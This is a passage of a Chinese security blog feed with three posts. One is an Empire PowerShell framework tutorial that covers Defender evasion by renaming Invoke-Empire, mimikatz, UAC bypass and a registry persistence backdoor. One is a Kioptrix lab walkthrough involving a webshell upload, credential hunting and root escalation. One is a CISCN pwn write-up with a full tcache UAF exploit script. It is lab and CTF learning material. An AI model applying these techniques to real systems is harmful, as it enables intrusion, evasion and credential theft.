    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>前些天看到这么一个类MSF的渗透测试的框架，但是二者的应用场景稍微有些不一样，遂来学习学习。</p><p>这个框架比较特殊的是主要使用powershell，比较容易绕过杀软</p><p>(官网)[<a href="http://www.powershellempire.com]看这里" target="_blank" rel="noopener">http://www.powershellempire.com]看这里</a><br>(github)[<a href="https://github.com/EmpireProject/Empire]看这里" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire]看这里</a></p><p>使用的话直接git clone 下来然后进入setup文件夹管理员权限运行install.sh，</p><p>不出意外的话会缺少很多python的模块，大部分pip就行，部分特殊的稍微搜寻下也能解决；</p><p>（pip install flask, pyopenssl, iptools, netifaces, pydispatcher, zlib_wrapper, macholib, pefile, xlrd, xlutils, pycrypto, dropbox, pyminifier）</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>需要注意的是进去之前要切换成管理员权限，不然就会提示写入只读数据库然后失败</p><p>然后我们可以输入help看下它提供的命令</p><figure class="image-box">                <img src="/2019/08/01/penetration-with-empire/func.png" alt="" title="" class="">                <p></p>            </figure><p>主要有四大模块：listeners,stagers,modules,agents</p><p>我们使用的话，一般就是先设置listeners，之后选择不同的stager，开始通过与agent进行交互后选择不同的module来实现想要的功能</p><h2 id="Listeners"><a href="#Listeners" class="headerlink" title="Listeners"></a>Listeners</h2><p>首先第一步当然是配置listeners;</p><p>输入Listeners，根据help看下相关的设置，可以看到主要是关于建立后的相关操作，当然也有相关的设置</p><p>输入uselistener 加两下tab，看下相关选项</p><figure class="image-box">                <img src="/2019/08/01/penetration-with-empire/uselistener.png" alt="" title="" class="">                <p></p>            </figure><p>可以看到五个http相关的，应该是根据客户端的不同来进行不同的配置，还有个msf的meterpreter，一个dropbox的dbx，还有其他两个</p><p>这里我们直接使用http，输入uselistener http，输入info查看参数<br>设置好Name,Port,Host，输入execute启动监听器即可</p><h2 id="stagers"><a href="#stagers" class="headerlink" title="stagers"></a>stagers</h2><p>之后我们需要一个stager，实际上就是一个powershell的脚本；<br>我们输入back可以返回界面，使用usestager 加两下tab看看选项</p><figure class="image-box">                <img src="/2019/08/01/penetration-with-empire/usestager.png" alt="" title="" class="">                <p></p>            </figure><p>可以看到有一些选择，其中osx是mac下的，windows不用多说，multi是面向多平台的</p><p>这里我们选择multi/launcher，输入options查看需要设置的选项</p><p>这里主要设置下Listener为我们前面的listener，然后需要注意的一点是SafeChecks选项，用来检测运行环境是否合适，这里默认的是开启，要求写的也是开启，但是开启的话是可能会没有反应，所以这里顺便把设置为False了。</p><p>还有点要注意是这样生成的脚本指令有可能会被杀软给拦截掉，原因的话看<a href="https://www.mike-gualtieri.com/posts/modifying-empire-to-evade-windows-defender" target="_blank" rel="noopener">这里</a>，也就是windows defender检测到了脚本中的Invoke-Empire，所以只需要将相关脚本（Empire/data/agent/stagers/http.ps1 与 Empire/data/agent/agent.ps1）中的Invoke-Empire修改为一个其他的名称就行</p><p>配置完成输入execute即可生成一串powershell的指令，可以将其写入到bat脚本里面；置入目标主机运行即可</p><figure class="image-box">                <img src="/2019/08/01/penetration-with-empire/stager.png" alt="" title="" class="">                <p></p>            </figure><p>这里尝试使用windows下的那几个stagers，均会被windows defender直接检测并删除，甚至都没有报毒提示…</p><h2 id="Agent"><a href="#Agent" class="headerlink" title="Agent"></a>Agent</h2><p>然后等待主机即可，主机上线后我们这边会直接有响应</p><p>输入agents即可查看主机，也可以输入list查看，list stale可以查看已经不在线的主机，如果想要删除主机使用remove 加主机名即可，只是这样仍然会收到目标主机反弹的shell</p><p>一般的话就先rename 主机名为一些好记的名字，之后interact 加主机名与其交互</p><figure class="image-box">                <img src="/2019/08/01/penetration-with-empire/agents.png" alt="" title="" class="">                <p></p>            </figure><p>可以看到又一些选项比如说sc可以截屏，mimikatz可以拿用户密码但是需要高权限，bypassuac可以尝试提权，shell加命令可以执行一些常见的操作。</p><p>需要注意的是这里提供的并非交互性的shell，所以会有短暂的延迟；大概是使用前面的http请求，因此隐蔽性较好</p><h2 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h2><p>使用usemodule 可以查看可以使用的模块，比如说关于代码执行的code_execution模块，还有关于后门persistence模块来实现持续的渗透</p><p>关于模块的描述可以看<a href="https://www.anquanke.com/post/id/87333#h2-4" target="_blank" rel="noopener">这篇文章</a></p><p>这里我们选择用户域的注册表后门</p><p>查看选项<br><figure class="image-box">                <img src="/2019/08/01/penetration-with-empire/registry.png" alt="" title="" class="">                <p></p>            </figure></p><p>我们可以设置监听的主机，使用的监听器，注册表的位置及键的名字等<br>设置为执行execute即可将其置入目标主机，这个在目标主机的注册表是可以看到的。</p><figure class="image-box">                <img src="/2019/08/01/penetration-with-empire/reg.png" alt="" title="" class="">                <p></p>            </figure><p>需要注意的是，这里的后门因为是开机启动，所以在用户重启后开机是会弹出小黑窗的，这个需要想办法来解决。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;前些天看到这么一个类MSF的渗透测试的框架，但是二者的应用场景稍微有些不一样，遂来学习学习。&lt;/p&gt;
&lt;p&gt;这个框架比较特殊的是主要使用po
      
    
    </summary>
    
      <category term="渗透" scheme="http://siriuswhiter.tk/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透" scheme="http://siriuswhiter.tk/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Kioptrix靶机渗透</title>
    <link href="http://siriuswhiter.tk/2019/07/30/Kioptrix%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>http://siriuswhiter.tk/2019/07/30/Kioptrix靶机渗透/</id>
    <published>2019-07-30T10:52:48.000Z</published>
    <updated>2019-08-12T05:24:03.461Z</updated>
    
    <content type="html"><![CDATA[<p><em>Kioptrix是vulhub上一个比较简单的靶机系列，下下来玩一玩</em></p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>方便起见，在这里<a href="https://www.vulnhub.com/?q=kioptrix&amp;sort=date-asc#" target="_blank" rel="noopener">下载</a></p><p>要对靶机进行一下网络的设置，开机进入高级选项，选择root进入<br>使用<code>ifconfig -a</code>看下网卡名称，修改<code>/etc/network/interfaces</code>，将最后两行的网卡名称修改为前面看到的</p><p>这里可能会出现即使是root也提示权限不足的问题，<code>mount -rw -o remount /</code>重新挂载根目录，重启即可。</p><h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h2><p>开局Nmap 先扫一下本地<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.10.10.131/24</span><br></pre></td></tr></table></figure></p><p>发现有一个ip 10.10.10.129开了22和80端口，应该就是我们的靶机了<br>再特定的扫一下(-sV 用来探测端口服务)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -T4 -p- 10.10.10.129</span><br></pre></td></tr></table></figure></p><p>发现<br><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level1\scan.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br></pre></td></tr></table></figure></p><p>尝试在网页上进一下，看到了一个登陆界面<br>不过既然有搭建网站，那么就先用御剑扫一下后台目录<br><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level1\back.png" alt="" title="" class="">                <p></p>            </figure></p><p>发现有个robots.txt，看一下有没有什么有意思的东西，</p><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level1\robots.png" alt="" title="" class="">                <p></p>            </figure><p>打开发现里面有个flag目录，进入得到第一个flag</p><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level1\flag1.png" alt="" title="" class="">                <p></p>            </figure><p>顺便看看别的目录有没有什么东西，基本上都不存在，就是admin_area这个目录写了个the admin area not work……</p><p>看下源码，结果就得到了第二个flag（好蠢）</p><p>同时也得到了用户名＋密码，回到主页登陆上去</p><p>看到一个上传界面，直接上马，竟然就这么上传成功了…毫无过滤，猜测应该在之前看到的uploaded_files目录中</p><p>打开网页验证，没有报不存在了，上蚁剑直接连接即可，</p><p>连上去看下有没有什么好东西，在html目录下发现有flag.txt和hint.txt，flag.txt可能是权限不够或者啥的，hint.txt找到了第三个flag</p><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level1\flag3.png" alt="" title="" class="">                <p></p>            </figure><p>同时告诉我们在一个隐藏的文件中可以找到technawi的密码来读取flag.txt</p><p>为了方便查找，在蚁剑中打开终端，使用grep搜索，(r递归搜索，n显示行数，s去掉错误信息)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rns technawi /etc</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level1\search.png" alt="" title="" class="">                <p></p>            </figure><p>credentials.txt 看着很有可能，打开查看</p><p>得到了用户名密码，顺便得到了flag4 </p><p><img src="/2019/07/30/Kioptrix靶机渗透/Level1\flag4.png" alt=""></p><p>顺手切换用户，结果报错</p><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level1\chuser.png" alt="" title="" class="">                <p></p>            </figure><p>然后没有找到什么好办法能够解决这个问题</p><p>回过头看，想起来还有个ssh的端口开着，就试着拿ssh登陆下，直接上去了</p><p>直接取查看flag.txt ，得到第五个也是最后一个flag</p><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level1\flag5.png" alt="" title="" class="">                <p></p>            </figure><p>到这里基本上就算是完成了，比较简单，所以整个逻辑都还是挺清晰的</p><p>最后，因为前面看到/home下有个.sudo_as_admin_successful文件，可以直接输入<code>sudo su</code>将technawi提权为root用户</p><h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><p>网络配置不好，待定//</p><h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><p>开局正常nmap扫ip，得到ip地址为10.10.10.132，开放端口22,80</p><p>又有web服务，打开网页登陆，没有看到什么很有价值的东西，倒是有个登陆界面</p><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level3\login.png" alt="" title="" class="">                <p></p>            </figure><p>先放一放，御剑扫下后台目录，发现有phpmyadmin，还有个update.php权限不够</p><p>回过头看登陆界面有个lotusCMS，可能能从这个地方下手，</p><p>打开msf搜索下这个CMS，运气比较好，有个RCE hhh</p><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level3\vuln.png" alt="" title="" class="">                <p></p>            </figure><p>既然有RCE那当然要直接上，配置好直接exploit拿下webshell</p><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level3\shell.png" alt="" title="" class="">                <p></p>            </figure><p>但是权限很小</p><p>到这里有点卡住了，主要是对于web的东西不是特别熟悉</p><p>看到说是搜索一波mysql的账户密码，直接grep -rns mysql_username /home</p><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level3\find.png" alt="" title="" class="">                <p></p>            </figure><p>看到gconfig.php那里可能有，去看下，找到了用户名密码（口吐芬芳的密码）</p><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level3\namepass.png" alt="" title="" class="">                <p></p>            </figure><p>回到前面找到的phpmyadmin，就可以直接登上去了</p><p>看到gallery下有个dev_accounts，但是密码都进行了md5，尝试去破解，结果可以直接破解成功</p><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level3\2user.png" alt="" title="" class="">                <p></p>            </figure><p>破解结果为：</p><p>dreg/Mast3r<br>loneferret/starwars</p><p>尝试发现longferret比较有用，ssh连接上去，看到目录下有个CompanyPolicy.README，然后里面的意思大概是这是CEO给我发的文件，需要我输入sudo ht，但是可能是因为终端不一样，使用ht会报错……</p><p>查了下这个ht大概是个编辑器，然后其他的vim nano什么的也打不开，应该是设置了可用命令</p><p>查下这个问题的解决方案，大概是改变下默认的TERM即可，输入<code>export TERM=xterm-color</code>即可</p><p>然后sudo ht，f1大概看下操作方式，（坑爹的快捷键冲突退不出来，每次写完保存好就只能重新登一下）</p><p>可以使用其来修改/etc/passwd中的文件来改变longferret的权限为root，</p><p>关于/etc/passwd可以看<a href="https://blog.csdn.net/yexiangCSDN/article/details/89963698" target="_blank" rel="noopener">这里</a></p><p>当然也可以在/etc/sudoers中添加比如说/bin/sh来拿权限</p><p><img src="/2019/07/30/Kioptrix靶机渗透/Level3\root.png" alt=""></p><p>可以看到拿到了root权限</p><p>回过头看看别人还有什么别的思路，发现有在扫目录的时候就发现了/gallery。。。可能因为我的字典太小了，根本没有扫到，</p><p>尝试使用kali自带的dirb来扫一波，确实扫的比御剑的字典多//</p><h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><p>下载下来是个vmdx 硬盘格式，需要在vmware中新建一个虚拟机，不使用镜像，均选择其他，然后删除硬盘，将该硬盘添加进去即可。</p><p>打开是个LigGoat Security Server的登陆界面</p><p>前面还是常规操作，找ip，查服务</p><figure class="image-box">                <img src="/2019/07/30/Kioptrix靶机渗透/Level4\service.png" alt="" title="" class="">                <p></p>            </figure><p>可以看到仍然开启了ssh，http服务，同时多开了139与445端口，开启了不知道是啥的服务</p><p>打开网页，看到是个Member Login系统，后台目录扫一波，只多看到个images</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;Kioptrix是vulhub上一个比较简单的靶机系列，下下来玩一玩&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; class=&quot;headerlink&quot; title=&quot;配置&quot;&gt;&lt;/a&gt;配置&lt;/h1&gt;&lt;p&gt;方便起见，在这里&lt;a href=&quot;ht
      
    
    </summary>
    
      <category term="渗透" scheme="http://siriuswhiter.tk/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透" scheme="http://siriuswhiter.tk/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ciscn 2019 决赛pwn</title>
    <link href="http://siriuswhiter.tk/2019/07/30/ciscn-2019-%E5%86%B3%E8%B5%9Bpwn/"/>
    <id>http://siriuswhiter.tk/2019/07/30/ciscn-2019-决赛pwn/</id>
    <published>2019-07-30T02:11:10.000Z</published>
    <updated>2019-10-14T06:42:13.533Z</updated>
    
    <content type="html"><![CDATA[<p><em>前几天去成都参加了信安大赛的总决赛，被师傅们吊起来打hhh，最后混了个二等奖，虽然说成绩不是特别好，但是自己菜不能怪别人嘛，继续努力吧，需要学的还有很多呢</em></p><h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><p>看着挺有意思的题目hhh</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>开始时初始化读取了flag文件然后将其重定向到了666，然后进入到了Sandbox禁止了某些操作（留坑，后面看下）</p><p>然后是主要的选项题，add remove show 还有最后的签字退出hhh</p><p>add在内部是分为int 与 short int来分别处理的，但是有个共享的bool作为判断位，在删除的时候会进行判断（如果不是为了留漏洞，真的程序这么写可太蠢了…）。因为没有使用数组和链表，所以同时只能控制一个int的chunk和short_int的chunk</p><p>show限制三次，remove时还是存在着UAF漏洞</p><p>最后退出前会调用scanf让留一堆话然后输出出来</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>结合前面的666与最后的scanf，应该是要让stdin的fd改为666使得在操作scanf时将flag输出</p><p>在gdb中进行测试，先看下stdin结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p  *(struct _IO_FILE_plus *) stdin</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    ...</span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    ...</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7fa0d8e252a0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接对其进行修改，再次打印<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p  $1-&gt;file-&gt;_fileno = 666</span><br><span class="line">$2 = 666</span><br><span class="line">pwndbg&gt; p  *(struct _IO_FILE_plus *) stdin</span><br><span class="line">$3 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    ...</span><br><span class="line">    _fileno = 666, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    ...</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7fa0d8e252a0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看到修改成功，直接继续运行程序，然后退出<br><figure class="highlight plain"><figcaption><span>Switching to interactive mode</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ 4</span><br><span class="line">what do you want to say at last? </span><br><span class="line">[*] Process &apos;./inode_heap&apos; stopped with exit code 0 (pid 15666)</span><br><span class="line">your message :this_is_flag we have received...</span><br><span class="line">have fun !</span><br></pre></td></tr></table></figure></p><p>发现scanf不再从键盘接收输入，直接打印出了预先写好的本地flag</p><p>这样问题就是利用前面tcache的UAF将其结构体进行修改</p><p>因为输出的时候使用的是%d，所以没办法完全泄露，因此会需要部分地址覆盖来利用偏移将free掉的unsorted bin中的fd指针为stdin-&gt;_fileno所在的地址。</p><p>整个过程比较麻烦，但是将思路捋清就不会有什么问题。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./inode_heap&apos;)</span><br><span class="line">elf = ELF(&apos;./inode_heap&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;./inode_heap&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line">def add_int(num):</span><br><span class="line">    sh.sendlineafter(&apos;&gt; &apos;, &apos;1&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;, &apos;1&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;your inode number:&apos;, str(num))</span><br><span class="line"></span><br><span class="line">def add_short(num):</span><br><span class="line">    sh.sendlineafter(&apos;&gt; &apos;, &apos;1&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;, &apos;2&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;your inode number:&apos;, str(num))</span><br><span class="line"></span><br><span class="line">def remove_int():</span><br><span class="line">    sh.sendlineafter(&apos;&gt; &apos;, &apos;2&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;, &apos;1&apos;)</span><br><span class="line"></span><br><span class="line">def remove_short():</span><br><span class="line">    sh.sendlineafter(&apos;&gt; &apos;, &apos;2&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;, &apos;2&apos;)</span><br><span class="line"></span><br><span class="line">def show_int():</span><br><span class="line">    sh.sendlineafter(&apos;&gt; &apos;, &apos;3&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;, &apos;1&apos;)</span><br><span class="line"></span><br><span class="line">def show_short():</span><br><span class="line">    sh.sendlineafter(&apos;&gt; &apos;, &apos;3&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;, &apos;2&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_int(0)</span><br><span class="line">remove_int()</span><br><span class="line">add_short(0)</span><br><span class="line">remove_int()</span><br><span class="line"></span><br><span class="line">show_int()</span><br><span class="line">sh.recvuntil(&apos;number :&apos;)</span><br><span class="line">heap = int(sh.recvline())</span><br><span class="line">if heap &lt; 0x100000000:</span><br><span class="line">    heap += 0x100000000</span><br><span class="line">print hex(heap)               # just half of sizeof(int)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_int(heap+0x20)</span><br><span class="line">add_int(0)</span><br><span class="line">add_int(0x91)</span><br><span class="line"></span><br><span class="line">add_int(0)</span><br><span class="line">add_int(0)</span><br><span class="line">add_int(0x21)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    remove_short()</span><br><span class="line">    add_int(0)</span><br><span class="line"></span><br><span class="line">remove_short()</span><br><span class="line">show_short()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;number :&apos;)</span><br><span class="line">half_libc = int(sh.recvline())</span><br><span class="line">if half_libc &lt;0 :</span><br><span class="line">    half_libc += 0x10000</span><br><span class="line">print hex(half_libc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#---------------------------------------------#</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add_short(half_libc-0x2a0+104)  #cover part of address so that main_arena+96 to struct stdin-&gt;_fileno</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_short(0)</span><br><span class="line">add_short(0)</span><br><span class="line">add_short(0)</span><br><span class="line">add_short(0)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">remove_short()</span><br><span class="line">add_int(0)</span><br><span class="line">remove_short()</span><br><span class="line">add_short(heap+0x30)</span><br><span class="line">add_short(0)</span><br><span class="line">add_short(0)</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;number:&apos;,&apos;666&apos;)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><p>掌握的不熟练，需要多练习几道…</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>c混合着c++写的程序，看着复杂了点。仍然是UAF漏洞，只有add delete功能，但是给了堆地址</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>所以就是利用tcache的UAF来修改stdout来泄露libc之后再劫持malloc_hook 或 free_hook即可<br>原理等可以看之前写的这里<a href="">https://siriuswhiter.github.io/2019/07/09/io-file-%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</a></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="17"><a href="#17" class="headerlink" title="17"></a>17</h1><p>决赛最简单的一道题目了吧，反正是pwn里面最简单的//</p><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>最开始先要login，会拿到随机的12个字节与输入比较</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">stream = fopen(&quot;/dev/urandom&quot;, &quot;rb&quot;);</span><br><span class="line">  fread(&amp;ptr, 0xCuLL, 1uLL, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  read(0, &amp;buf, 0x10uLL);</span><br><span class="line">  if ( !strncmp(&amp;buf, &amp;ptr, 0xCuLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Welcome, MIB Agent.&quot;);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;&gt; &quot;, &amp;ptr);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">    if ( (signed int)v1 &gt; 0xFF || !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Access denied.&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    result = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果登录成功会进入一个选项，可以malloc 和free，malloc大小限制为0-0x7F，free限制两次；</p><p>如果没有选择这两个选项，就会进行一个比较，s1处之前是The cake is not a lie!，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( !strcmp(s1, &quot;The cake is a lie!&quot;) )</span><br><span class="line">  get_shellcode();</span><br></pre></td></tr></table></figure></p><p>假如验证通过，就会读取0x50个字节，对其进行简单的处理，之后执行输入的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v3 = strlen(a1);</span><br><span class="line"> for ( i = 0; ; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   result = i;</span><br><span class="line">   if ( (signed int)i 